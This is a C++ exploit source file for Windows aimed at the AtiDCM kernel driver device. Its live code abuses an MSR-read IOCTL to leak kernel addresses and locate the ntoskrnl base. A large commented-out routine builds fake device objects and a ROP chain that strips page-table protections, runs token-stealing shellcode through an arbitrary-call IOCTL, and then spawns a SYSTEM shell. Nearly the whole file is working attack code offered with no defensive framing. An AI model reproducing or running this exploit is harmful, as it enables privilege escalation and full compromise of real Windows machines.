// DrvExpTemplate.cpp : Questo file contiene la funzione 'main', in cui inizia e termina l'esecuzione del programma.
//

#include <iostream>
#include <windows.h>




typedef struct _IO_TIMER* PIO_TIMER;
typedef short CSHORT;
#define DEVICE_TYPE ULONG;

#define MAXIMUM_VOLUME_LABEL_LENGTH  (32 * sizeof(WCHAR)) // 32 characters
#define TIMER_TOLERABLE_DELAY_BITS      6
#define TIMER_EXPIRED_INDEX_BITS        6
#define TIMER_PROCESSOR_INDEX_BITS      5

DWORD64 g_ntbase = 0;
DWORD64 g_kisystemcall64shadow = 0;

//typedef struct _VPB {
//	CSHORT Type;
//	CSHORT Size;
//	USHORT Flags;
//	USHORT VolumeLabelLength; // in bytes
//	struct _DEVICE_OBJECT* DeviceObject;
//	struct _DEVICE_OBJECT* RealDevice;
//	ULONG SerialNumber;
//	ULONG ReferenceCount;
//	WCHAR VolumeLabel[MAXIMUM_VOLUME_LABEL_LENGTH / sizeof(WCHAR)];
//} VPB, * PVPB;
//
//typedef enum _IO_ALLOCATION_ACTION {
//	KeepObject = 1,
//	DeallocateObject,
//	DeallocateObjectKeepRegisters
//} IO_ALLOCATION_ACTION, * PIO_ALLOCATION_ACTION;
//
//typedef
//_Function_class_(DRIVER_CONTROL)
//_IRQL_requires_same_
//IO_ALLOCATION_ACTION
//DRIVER_CONTROL(
//	_In_ struct _DEVICE_OBJECT* DeviceObject,
//	_Inout_ struct _IRP* Irp,
//	_In_ PVOID MapRegisterBase,
//	_In_ PVOID Context
//);
//typedef DRIVER_CONTROL* PDRIVER_CONTROL;
//
//typedef struct _KDEVICE_QUEUE_ENTRY {
//	LIST_ENTRY DeviceListEntry;
//	ULONG SortKey;
//	BOOLEAN Inserted;
//} KDEVICE_QUEUE_ENTRY, * PKDEVICE_QUEUE_ENTRY, * PRKDEVICE_QUEUE_ENTRY;
//
//typedef struct _WAIT_CONTEXT_BLOCK {
//	union {
//		KDEVICE_QUEUE_ENTRY WaitQueueEntry;
//		struct {
//			LIST_ENTRY DmaWaitEntry;
//			ULONG NumberOfChannels;
//			ULONG SyncCallback : 1;
//			ULONG DmaContext : 1;
//			ULONG ZeroMapRegisters : 1;
//			ULONG Reserved : 9;
//			ULONG NumberOfRemapPages : 20;
//		};
//	};
//	PDRIVER_CONTROL DeviceRoutine;
//	PVOID DeviceContext;
//	ULONG NumberOfMapRegisters;
//	PVOID DeviceObject;
//	PVOID CurrentIrp;
//	PVOID BufferChainingDpc;
//} WAIT_CONTEXT_BLOCK, * PWAIT_CONTEXT_BLOCK;
//
//typedef struct _KDPC {
//	union {
//		ULONG TargetInfoAsUlong;
//		struct {
//			UCHAR Type;
//			UCHAR Importance;
//			volatile USHORT Number;
//		} DUMMYSTRUCTNAME;
//	} DUMMYUNIONNAME;
//
//	SINGLE_LIST_ENTRY DpcListEntry;
//	KAFFINITY ProcessorHistory;
//	PVOID DeferredRoutine;
//	PVOID DeferredContext;
//	PVOID SystemArgument1;
//	PVOID SystemArgument2;
//	__volatile PVOID DpcData;
//} KDPC, * PKDPC, * PRKDPC;
//
//
//typedef struct _KDEVICE_QUEUE {
//	CSHORT Type;
//	CSHORT Size;
//	LIST_ENTRY DeviceListHead;
//	KSPIN_LOCK Lock;
//
//#if defined(_AMD64_)
//
//	union {
//		BOOLEAN Busy;
//		struct {
//			LONG64 Reserved : 8;
//			LONG64 Hint : 56;
//		};
//	};
//
//#else
//
//	BOOLEAN Busy;
//
//#endif
//
//} KDEVICE_QUEUE, * PKDEVICE_QUEUE, * PRKDEVICE_QUEUE;
//
//typedef struct _DISPATCHER_HEADER {
//	union {
//		union {
//			volatile LONG Lock;
//			LONG LockNV;
//		} DUMMYUNIONNAME;
//
//		struct {                            // Events, Semaphores, Gates, etc.
//			UCHAR Type;                     // All (accessible via KOBJECT_TYPE)
//			UCHAR Signalling;
//			UCHAR Size;
//			UCHAR Reserved1;
//		} DUMMYSTRUCTNAME;
//
//		struct {                            // Timer
//			UCHAR TimerType;
//			union {
//				UCHAR TimerControlFlags;
//				struct {
//					UCHAR Absolute : 1;
//					UCHAR Wake : 1;
//					UCHAR EncodedTolerableDelay : TIMER_TOLERABLE_DELAY_BITS;
//				} DUMMYSTRUCTNAME;
//			};
//
//			UCHAR Hand;
//			union {
//				UCHAR TimerMiscFlags;
//				struct {
//
//#if !defined(KENCODED_TIMER_PROCESSOR)
//
//					UCHAR Index : TIMER_EXPIRED_INDEX_BITS;
//
//#else
//
//					UCHAR Index : 1;
//					UCHAR Processor : TIMER_PROCESSOR_INDEX_BITS;
//
//#endif
//
//					UCHAR Inserted : 1;
//					volatile UCHAR Expired : 1;
//				} DUMMYSTRUCTNAME;
//			} DUMMYUNIONNAME;
//		} DUMMYSTRUCTNAME2;
//
//		struct {                            // Timer2
//			UCHAR Timer2Type;
//			union {
//				UCHAR Timer2Flags;
//				struct {
//					UCHAR Timer2Inserted : 1;
//					UCHAR Timer2Expiring : 1;
//					UCHAR Timer2CancelPending : 1;
//					UCHAR Timer2SetPending : 1;
//					UCHAR Timer2Running : 1;
//					UCHAR Timer2Disabled : 1;
//					UCHAR Timer2ReservedFlags : 2;
//				} DUMMYSTRUCTNAME;
//			} DUMMYUNIONNAME;
//
//			UCHAR Timer2ComponentId;
//			UCHAR Timer2RelativeId;
//		} DUMMYSTRUCTNAME3;
//
//		struct {                            // Queue
//			UCHAR QueueType;
//			union {
//				UCHAR QueueControlFlags;
//				struct {
//					UCHAR Abandoned : 1;
//					UCHAR DisableIncrement : 1;
//					UCHAR QueueReservedControlFlags : 6;
//				} DUMMYSTRUCTNAME;
//			} DUMMYUNIONNAME;
//
//			UCHAR QueueSize;
//			UCHAR QueueReserved;
//		} DUMMYSTRUCTNAME4;
//
//		struct {                            // Thread
//			UCHAR ThreadType;
//			UCHAR ThreadReserved;
//
//			union {
//				UCHAR ThreadControlFlags;
//				struct {
//					UCHAR CycleProfiling : 1;
//					UCHAR CounterProfiling : 1;
//					UCHAR GroupScheduling : 1;
//					UCHAR AffinitySet : 1;
//					UCHAR Tagged : 1;
//					UCHAR EnergyProfiling : 1;
//					UCHAR SchedulerAssist : 1;
//
//#if !defined(_X86_)
//
//					UCHAR ThreadReservedControlFlags : 1;
//
//#else
//
//					UCHAR Instrumented : 1;
//
//#endif
//
//				} DUMMYSTRUCTNAME;
//			} DUMMYUNIONNAME;
//
//			union {
//				UCHAR DebugActive;
//
//#if !defined(_X86_)
//
//				struct {
//					BOOLEAN ActiveDR7 : 1;
//					BOOLEAN Instrumented : 1;
//					BOOLEAN Minimal : 1;
//					BOOLEAN Reserved4 : 2;
//					BOOLEAN AltSyscall : 1;
//					BOOLEAN UmsScheduled : 1;
//					BOOLEAN UmsPrimary : 1;
//				} DUMMYSTRUCTNAME;
//
//#endif
//
//			} DUMMYUNIONNAME2;
//		} DUMMYSTRUCTNAME5;
//
//		struct {                         // Mutant
//			UCHAR MutantType;
//			UCHAR MutantSize;
//			BOOLEAN DpcActive;
//			UCHAR MutantReserved;
//		} DUMMYSTRUCTNAME6;
//	} DUMMYUNIONNAME;
//
//	LONG SignalState;                   // Object lock
//	LIST_ENTRY WaitListHead;            // Object lock
//} DISPATCHER_HEADER, * PDISPATCHER_HEADER;
//
//
//typedef struct _KEVENT {
//	DISPATCHER_HEADER Header;
//} KEVENT, * PKEVENT, * PRKEVENT;
//
//typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT) _DEVICE_OBJECT {
//	CSHORT Type;
//	USHORT Size;
//	LONG ReferenceCount;
//	struct _DRIVER_OBJECT* DriverObject;
//	struct _DEVICE_OBJECT* NextDevice;
//	struct _DEVICE_OBJECT* AttachedDevice;
//	struct _IRP* CurrentIrp;
//	PIO_TIMER Timer;
//	ULONG Flags;                                // See above:  DO_...
//	ULONG Characteristics;                      // See ntioapi:  FILE_...
//	__volatile PVPB Vpb;
//	PVOID DeviceExtension;
//	ULONG DeviceType;
//	CCHAR StackSize;
//	union {
//		LIST_ENTRY ListEntry;
//		WAIT_CONTEXT_BLOCK Wcb;
//	} Queue;
//	ULONG AlignmentRequirement;
//	KDEVICE_QUEUE DeviceQueue;
//	KDPC Dpc;
//
//	//
//	//  The following field is for exclusive use by the filesystem to keep
//	//  track of the number of Fsp threads currently using the device
//	//
//
//	ULONG ActiveThreadCount;
//	PSECURITY_DESCRIPTOR SecurityDescriptor;
//	KEVENT DeviceLock;
//
//	USHORT SectorSize;
//	USHORT Spare1;
//
//	struct _DEVOBJ_EXTENSION* DeviceObjectExtension;
//	PVOID  Reserved;
//
//} DEVICE_OBJECT;
//
//typedef struct _DEVICE_OBJECT* PDEVICE_OBJECT;



#define SIZE_BUF 4096
#define IOCTL_READMSR 0x22e09c
#define IOCTL_ARBITRARYCALLDRIVER    0x22e04c
#define IA32_GS_BASE 0xc0000101
#define IA32_LSTAR	0xc0000082
#define IA32_STAR	0xc0000081

HANDLE g_device;

void printBuffer(PCHAR buf,char* name,SIZE_T size) {
	printf("%s:\n", name);
	for (int i = 0; i < size; i++) {
		printf("buf[%d] = 0x%x\n", i,buf[i]);
	}

}

BOOL readMSR(DWORD msr_value,PVOID outputBuffer, SIZE_T outSize) {
	char* inputBuffer = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	*((DWORD*)inputBuffer) = msr_value;

	if (inputBuffer == NULL)
		return -2;

	printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);
	

	DWORD bytesRet = 0;

	
	BOOL res = DeviceIoControl(
		g_device,
		IOCTL_READMSR,
		inputBuffer,
		SIZE_BUF,
		outputBuffer,
		outSize,
		&bytesRet,
		NULL
	);

	printf("[*] sent IOCTL_READMSR \n");
	if (!res) {
		printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
	}
	return res;
}

//unsigned int ExtractPml4Index(PVOID address)
//{
//	return ((uintptr_t)address >> 39) & 0x1ff;
//}
//
//BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
//	char* inputBuffer = (char*)VirtualAlloc(
//		NULL,
//		21,
//		MEM_COMMIT | MEM_RESERVE,
//		PAGE_EXECUTE_READWRITE);
//
//	/*char* object = (char*)VirtualAlloc(
//		(LPVOID)(0x0000001af5ffe000),
//		0x12000,
//		MEM_COMMIT | MEM_RESERVE,
//		PAGE_EXECUTE_READWRITE);
//	printf("[+] object = 0x%p\n", object);
//	object = (char*)(0x1af6000000 - 0x30);
//	printf("[+] second object = 0x%p\n", object);*/
//
//	char* object = (char*)VirtualAlloc(
//		(LPVOID)(0x0000001afeffe000),
//		0x12000,
//		MEM_COMMIT | MEM_RESERVE,
//		PAGE_EXECUTE_READWRITE);
//	printf("[+] object = 0x%p\n", object);
//	object = (char*)(0x1aff000000 - 0x30);
//	printf("[+] second object = 0x%p\n", object);
//
//	PDEVICE_OBJECT ptr = (PDEVICE_OBJECT)(object + 0x30);
//
//	memset(object, 0x41, 0x30);
//
//	printf("[+] ptr = 0x%p\n", ptr);
//	char* object2 = (char*)VirtualAlloc(
//		NULL,
//		SIZE_BUF,
//		MEM_COMMIT | MEM_RESERVE,
//		PAGE_EXECUTE_READWRITE);
//	/*char* object2 = (char*)VirtualAlloc(
//		(LPVOID)(0x0000001af5ffe000),
//		0x12000,
//		MEM_COMMIT | MEM_RESERVE,
//		PAGE_EXECUTE_READWRITE);*/
//
//	printf("[+] object2 = 0x%p\n", object2); //0x0000001af5ff0000
//	//object2 = (char*)(0x1af6000000 - 0x30);
//	//printf("[+] second object2 = 0x%p\n", object2);
//	memset(object2, 0x43, 0x30);
//
//	/*char* driverObject = (char*)VirtualAlloc(
//		(LPVOID)0x0000002a2b2a0000,
//		SIZE_BUF,
//		MEM_COMMIT | MEM_RESERVE,
//		PAGE_EXECUTE_READWRITE);*/
//
//	char* driverObject = (char*)VirtualAlloc(
//		NULL,
//		SIZE_BUF,
//		MEM_COMMIT | MEM_RESERVE,
//		PAGE_EXECUTE_READWRITE);
//
//	memset(driverObject, 0x50, SIZE_BUF);
//	printf("[+] driverObject = 0x%p\n", driverObject);
//	char* ptrDriver = driverObject + 0x30;
//	char* pDriverFunction = ptrDriver + 0x1b*8+0x70;
//
//	*((PDWORD64)pDriverFunction) = g_ntbase+ 0x40ac03;   //mov esp, ebx; ret
//
//	ptr->AttachedDevice = (PDEVICE_OBJECT)(object2 + 0x30);
//
//	
//	memset(ptr->AttachedDevice, 0x42, SIZE_BUF-0x40);
//	//*((DWORD*)ptr->AttachedDevice) = 0xf6000000;
//
//	printf("[+] ptr->AttachedDevice = 0x%p\n", ptr->AttachedDevice);
//	
//	PULONGLONG fake_stack = (PULONGLONG)VirtualAlloc((LPVOID)0x00000000feffe000, 0x12000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//	
//	if (fake_stack == 0) {
//		printf("[-] VirtualAlloc failed with error: %d\n", GetLastError());
//		exit(0);
//	}
//	printf("[*] fake_stack = 0x%p\n", fake_stack);
//
//	PULONGLONG ropStack = (PULONGLONG)fake_stack + 0x2000;
//
//	if (!VirtualLock((char*)ropStack - 0x3000, 0x10000)) {
//		printf("[-] virtualLock failed with error: %d\n", GetLastError());
//		exit(0);
//	}
//
//	memset(fake_stack, 0x41, 0x12000);
//	
//	
//
//	printf("[+] VirtualLock returned successfully\n");
//
//	printf("[*] ropStack = 0x%p\n", ropStack);
//	DWORD index = 0;
//
//
//	char* scbase = (char*)VirtualAlloc((LPVOID)0x1a1a1a000000, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//	if (!VirtualLock(scbase, 0x5000)) {
//		printf("[-] virtualLock failed with error: %d\n", GetLastError());
//		exit(0);
//	}
//	memset(scbase, 0x42, 0x5000);
//	char* sc = scbase + 0x3500;
//	memcpy(sc, mytoken_steal, sizeof(mytoken_steal));
//
//
//	unsigned int pml4shellcode_index = ExtractPml4Index(sc);
//	printf("[*] sc = 0x%p\n", sc);
//	printf("[*] pml4shellcode_index 0x%p\n", pml4shellcode_index);
//
//	//<get base from nt!MiGetPteAddress+0x13>
//	ropStack[index] = g_ntbase + 0x203beb; index++; // pop rax; ret;
//	ropStack[index] = g_ntbase + 0x2abaf7; index++; // address of nt!MiGetPteAddress+0x13
//	ropStack[index] = g_ntbase + 0x235aa6; index++; // mov rax, qword ptr [rax]; ret;
//	//<get base from nt!MiGetPteAddress+0x13>
//
//	//<get pml4Index>
//	ropStack[index] = g_ntbase + 0x34bb9c; index++; // pop rdx; ret;
//	ropStack[index] = 0x1ff; index++; // 0x1ff
//	ropStack[index] = g_ntbase + 0x752664; index++;// shr rax, 0xc; ret;
//	ropStack[index] = g_ntbase + 0x752664; index++;// shr rax, 0xc; ret;
//	ropStack[index] = g_ntbase + 0x752664; index++;// shr rax, 0xc; ret;
//	ropStack[index] = g_ntbase + 0x38738b; index++;//shr rax, 3; ret;
//	ropStack[index] = g_ntbase + 0x358532; index++;// and rax, rdx; ret;
//	//<get pml4index> now pml4index in rax
//
//	//<move pml4index in rcx>
//	ropStack[index] = g_ntbase + 0x34bb9c; index++;// pop rdx; ret;
//	ropStack[index] = (ULONGLONG)&ropStack[index + 3]; index++;
//	ropStack[index] = g_ntbase + 0x35dbc9; index++; // mov qword ptr [rdx], rax; ret;
//	ropStack[index] = g_ntbase + 0x2053e5; index++; // pop rcx; ret;
//	ropStack[index] = 0x4141414141414141; index++;//dummy
//	//<mov pml4index in rcx>
//
//	//<get pml4 address>
//	ropStack[index] = g_ntbase + 0x203beb; index++;// pop rax; ret;
//	ropStack[index] = 0xffff; index++;
//	//first round
//	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
//	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
//	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
//	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
//	//second round
//	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
//	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
//	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
//	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
//	//third round
//	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
//	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
//	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
//	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
//	//fourth round
//	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
//	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
//	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
//	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
//	//fifth round
//	ropStack[index] = g_ntbase + 0x322d1b; index++;// shl rax, 0xc; ret;
//	ropStack[index] = g_ntbase + 0x2053e5; index++; // pop rcx; ret;
//	ropStack[index] = (DWORD64)pml4shellcode_index * 8; index++;
//	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
//	//<get pml4 address> pml4 address in rax
//	
//	//<clean owner bit O=S position 2>
//	ropStack[index] = g_ntbase + 0x34bb9c; index++;// pop rdx; ret;
//	ropStack[index] = 0x2; index++;
//	ropStack[index] = g_ntbase + 0x354294; index++;// btr qword ptr [rax], rdx; ret;
//	//<clean owner bit O=S position 2>
//
//	//<clean NX bit position 63>
//	ropStack[index] = g_ntbase + 0x34bb9c; index++;// pop rdx; ret;
//	ropStack[index] = 63; index++;
//	ropStack[index] = g_ntbase + 0x354294; index++;// btr qword ptr [rax], rdx; ret;
//	//<clean NX bit position 63>
//
//	ropStack[index] = g_ntbase + 0x370050; index++; // wbinvd; ret;
//
//	//<shellcode>
//	ropStack[index] = (ULONGLONG)sc; index++;
//
//	//<cleanup>
//	ropStack[index] = g_ntbase + 0x35dbc9; index++; // mov qword ptr [rdx], rax; ret;
//	ropStack[index] = g_ntbase + 0x3d4cba; index++; // xor rax, rax; ret;
//	ropStack[index] = g_ntbase + 0x370050; index++; // wbinvd; ret;
//	ropStack[index] = g_ntbase + 0x20505a; index++; // pop rsp; ret;
//	ropStack[index] = 0x4141414141414141; index++; // filled with rsp value
//	//<cleanup>
//
//	///*modify PTE seems not working due to KVA shadowing*/
//	////<call MiGetPteAddress in order to get PTE. PTE address returned in rax>
//	//ropStack[index] = g_ntbase + 0x2053e5; index++; // pop rcx; ret;
//	////ropStack[index] = 0xff000000; index++;			// shellcode address pte
//	//ropStack[index] = (ULONGLONG)(scbase+0x3000); index++;			// shellcode address pte
//	//ropStack[index] = g_ntbase + 0x203beb; index++; // pop rax; ret;
//	//ropStack[index] = g_ntbase + 0x2abae4; index++; //address of nt!MiGetPteAddress
//	//ropStack[index] = g_ntbase + 0x2803b8; index++; // jmp rax;
//	//// <call MiGetPteAddress in order to get PTE. PTE address returned in rax>
//
//	//// <Flip U=S bit>  PTE VA already in rax
//	//ropStack[index] = g_ntbase + 0x20FA62; index++;	// pop rcx; ret;
//	//ropStack[index] = 0x0000000000000063; index++;  // DIRTY + ACCESSED + R/W + PRESENT
//	//ropStack[index] = g_ntbase + 0x4531f1; index++;	// mov byte ptr[rax], cl; ret;
//	//ropStack[index] = g_ntbase + 0x370050; index++; // wbinvd; ret;
//	//// </Flip U=S bit>
//	//
//	////ropStack[index] = g_ntbase + 0xb1451c; index++;// mov rax, cr4; or rax, 0x40; mov cr4, rax; ret;
//	////ropStack[index] = g_ntbase + 0x2053e5; index++; // pop rcx; ret;
//	////ropStack[index] = 0x0000000000100000; index++;	// bit 20 = 1
//	////ropStack[index] = g_ntbase + 0x304252; index++; //sub rax, rcx; ret;
//	////ropStack[index] = g_ntbase + 0x370050; index++; // wbinvd; ret;
//
//	//// <shellcode>
//	//ropStack[index] = (ULONGLONG)sc; index++;      // Shellcode address
//	////// <shellcode>
//	//////ropStack[index] = 0xfffff80025cebef5; index++;
//	////ropStack[index] = 0xFFFFF8002D9F228B; index++;
//	////ropStack[index] = 0x0; index++;
//	////// <reset rsp>
//	////ropStack[index] = g_ntbase + 0x20dca0; index++; // KeGetCurrentThread()->mov   rax,qword ptr gs:[188h];ret
//	////ropStack[index] = g_ntbase + 0x20FA62; index++;	// pop rcx; ret;
//	////ropStack[index] = 0x0000000000000028; index++;  // offset to _KTHREAD->InitialStack
//	////ropStack[index] = g_ntbase + 0x2abaff; index++; // add rax, rcx; ret;
//	////ropStack[index] = g_ntbase + 0x235aa6; index++; // mov rax, qword ptr[rax]; ret;
//	////ropStack[index] = g_ntbase + 0x20FA62; index++;	// pop rcx; ret;
//	////ropStack[index] = 0x0000000000000028; index++;  // delta to original stack
//	////
//
//	//												// 4219c2: mov r11, qword ptr [rsp + 8]; add rsp, 0x10; ret;
//	//// <reset rsp>
//
//	//memcpy((fake_stack + 0x2020), mytoken_steal, sizeof(mytoken_steal));
//#ifdef _DEBUG
//	for (int i = 0; i < index; i++) {
//		printf("ropStack[%d] %p : 0x%p\n", i, &ropStack[i], ropStack[i]);
//	}
//#endif
//	ptr->AttachedDevice->DriverObject = (_DRIVER_OBJECT*)ptrDriver;
//	ptr->AttachedDevice->AttachedDevice = 0;
//	char* ptr2 = inputBuffer;
//	*(ptr2) = 0;
//	ptr2 += 1;
//	*((PDWORD64)ptr2) = (DWORD64)ptr;
//	
//
//	printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);
//
//	DWORD bytesRet = 0;
//
//	BOOL res = DeviceIoControl(
//		g_device,
//		IOCTL_ARBITRARYCALLDRIVER,
//		inputBuffer,
//		SIZE_BUF,
//		outputBuffer,
//		outSize,
//		&bytesRet,
//		NULL
//	);
//
//	printf("[*] sent IOCTL_ARBITRARYCALLDRIVER \n");
//	if (!res) {
//		printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
//	}
//	printf("[+] IOCTL_ARBITRARYCALLDRIVER  returned successfully.\n");
//	return res;
//}

int main()
{
#ifndef _DEBUG
	DWORD bytesRet = 0;


	PVOID baseAddress =(PVOID)0x4800000;
	PVOID stack = (char*)VirtualAlloc(
		baseAddress,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	g_device = CreateFileA(
		"\\\\.\\AtiDCM",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);



	if (g_device == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open handle to device.");
		return -1;
	}

	printf("[+] Opened handle to device: 0x%8p\n", g_device);
#endif
	char* outputBuffer = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);


	memset(outputBuffer, 0x0, SIZE_BUF);

#ifndef DEBUG

	if (readMSR(IA32_GS_BASE, outputBuffer, SIZE_BUF)) {
		printf("[+] readMSR success.\n");
		printf("IA32_GS_BASE = 0x%8p\n", *((DWORD64*)(outputBuffer+12)));
		printf("IA32_GS_BASE = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
		/*printBuffer(outputBuffer, (char*)"outputBuffer", SIZE_BUF);*/
	}

	if (readMSR(IA32_LSTAR, outputBuffer, SIZE_BUF)) {
		printf("[+] readMSR success.\n");
		printf("IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 12)));
		printf("IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
		g_kisystemcall64shadow = *((DWORD64*)(outputBuffer + 12));
		g_ntbase = (DWORD64)g_kisystemcall64shadow - 0xaf61c0;
		printf("[+] g_ntbase = 0x%p\n", g_ntbase);
	}
#endif
	/*if (readMSR(IA32_STAR, outputBuffer, SIZE_BUF)) {
		printf("[+] readMSR success.\n");
		printf("IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 12)));
		printf("IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
		g_kisystemcall64shadow = *((DWORD64*)(outputBuffer + 12));
		g_ntbase = (DWORD64)g_kisystemcall64shadow + g_kisystemcall64shadow - 0x42b70c;
		printf("[+] g_ntbase = 0x%p\n", g_ntbase);
		if (g_ntbase == NT_BASE) {
			printf("[+] g_ntbase match with expected NT_BASE\n");
		}
	}*/

	//arbitraryCallDriver(outputBuffer, SIZE_BUF);
	//printf("[*] spawning system shell...\n");
	//system("cmd.exe");
	//return 0;
}